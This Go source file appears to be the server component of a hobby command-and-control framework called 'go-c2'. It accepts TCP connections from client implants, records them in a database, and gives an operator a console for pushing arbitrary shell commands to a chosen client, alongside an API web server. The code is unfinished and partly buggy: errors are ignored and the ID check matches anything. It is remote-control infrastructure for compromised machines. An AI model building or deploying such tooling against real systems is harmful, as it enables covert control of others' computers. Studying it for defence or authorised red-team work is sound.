package main

import (
	"bufio"
	"encoding/gob"
	"fmt"
	"go-c2/server/utils"
    "go-c2/server/webserver"
	"log"
	"net"
	"os"
	"regexp"
	"strings"
    "time"
)

const help = `help -> shows help
showClients -> shows connected available clients
use [id/Uid] -> use a client to send commands
back (inside the use command) -> comes back to the main menu
exit -> exits the server
`

var isUid = regexp.MustCompile(`[a-z0-9]{8}\-[a-z0-9]{4}\-[a-z0-9]{4}\-[a-z0-9]{4}\-[a-z0-9]{12}`).MatchString
var isId = regexp.MustCompile(`[0-9]*`).MatchString


// Function that handles the registration phase
func handleRegister(conn net.Conn, server *utils.Server, logger *utils.Logger) {
    dec := gob.NewDecoder(conn)
    client := &utils.Client{}
    dec.Decode(client)

    err := utils.InsertNewClientQuery(*client)
    if err != nil {
        log.Fatal(err)
    }

    logger.InfoLogger.Println("Client "+client.Uid+" added to database")

    // Sends confirmation mesage to client so he knows that he was accepted
    server.SendConfirmationMessageToClient(client, logger)
}

// DOING: Function to execute commands on client
func execCommand(clientUid string, client utils.Client, server *utils.Server, logger *utils.Logger) int {
    for {
        reader := bufio.NewReader(os.Stdin)
        fmt.Printf("\ncommand in client (%s) > ", clientUid)
        commandToClient, err := reader.ReadString('\n')
        commandToClient = strings.TrimSpace(commandToClient)

        if err != nil {
            logger.ErrorLogger.Println("Error while reading the user input")
            break
        } else {
            if commandToClient == "back" {
                return 1
            } else {
                server.SendCommandToClient(client, commandToClient, logger)
                time.Sleep(1 * time.Second) // FIXME: bug 1
            }
        }
    }

    return 0
}


// Function to use a client to send commands
func useClient(input string, server *utils.Server, logger *utils.Logger) {
  for {
        if len(strings.Split(input, " ")) == 1 {
            fmt.Println("Please provide the client id to execute commands")
            break
        }

        id := strings.Split(input, " ")[1]

        var client utils.Client
        var err error

        if isUid(id) {
            if client , err = utils.CheckClientExistence(id); err != nil {
                logger.ErrorLogger.Printf("Failed while trying to CheckClientExistence %s\n", err)
            }
        } else if isId(id) {
            if client, err = utils.CheckClientExistence(id); err != nil {
                logger.ErrorLogger.Printf("Failed while trying to CheckClientExistence %s\n", err)
            }
        } else {
            fmt.Println("This is not a valid Id/Uid for a client")
        }

        if execCommand(id, client, server, logger) == 1 {
            break
        }

    }
}

// Function that waits for stdin commands
func respondsToStdin(server *utils.Server, logger *utils.Logger) {
    for {
        reader := bufio.NewReader(os.Stdin)
        fmt.Print("\ncommand > ")
        input, err := reader.ReadString('\n')
        input = strings.TrimSpace(input)

        if err != nil{
            logger.ErrorLogger.Println("Error while reading the user input")
        } else {
            switch {

            case strings.Contains(input,"help"):
                fmt.Printf(help)

            case strings.Contains(input, "showClients"):
                if err := utils.SelectAllClientsQuery(); err != nil {
                    fmt.Println("Failed while trying to showClients %w\n", err)
                    logger.ErrorLogger.Printf("Failed while trying to showClients %s\n", err)
                }

            case strings.HasPrefix(input, "use"):
                useClient(input, server, logger)

            case strings.Contains(input, "exit"):
                fmt.Println("Going to exit...")
                return
            }
        }

    }

}


// Starts server
func startServer(server *utils.Server, logger *utils.Logger) {
    server.AssignData()
    var err error

    server.ServerSocket, err = net.Listen(server.Type, server.Host+":"+server.Port)
    if err != nil {
        logger.ErrorLogger.Println("Error listening:", err.Error())
    }

    defer server.ServerSocket.Close()

    logger.InfoLogger.Println("Listening on "+ server.Host + ":" + server.Port)

    // Waits for new Client connections
    for {

        connection, err := server.ServerSocket.Accept()
        if err != nil {
            logger.ErrorLogger.Println("Error accepting: ", err.Error())
        }

        go handleRegister(connection, server, logger)
    }

}

// Function that handles the errors
func run() error {
    logFile, err := os.OpenFile("/home/brun0/Desktop/go-c2/log/file.log", os.O_APPEND | os.O_CREATE | os.O_WRONLY, 0666)
    if err != nil {
        log.Fatalf("Error while seting up the log file %s", err)
    }

    defer logFile.Close()

    logger := &utils.Logger{}
    logger.Start(logFile)

    server := &utils.Server{}

    go startServer(server, logger) // starts listening for clients
    go webserver.RunAPI() // starts API server
    respondsToStdin(server, logger) // responds to stdin commands

    return nil
}

func main() {
    if err := run(); err != nil {
        fmt.Fprint(os.Stderr, err)
        os.Exit(1)
    }
}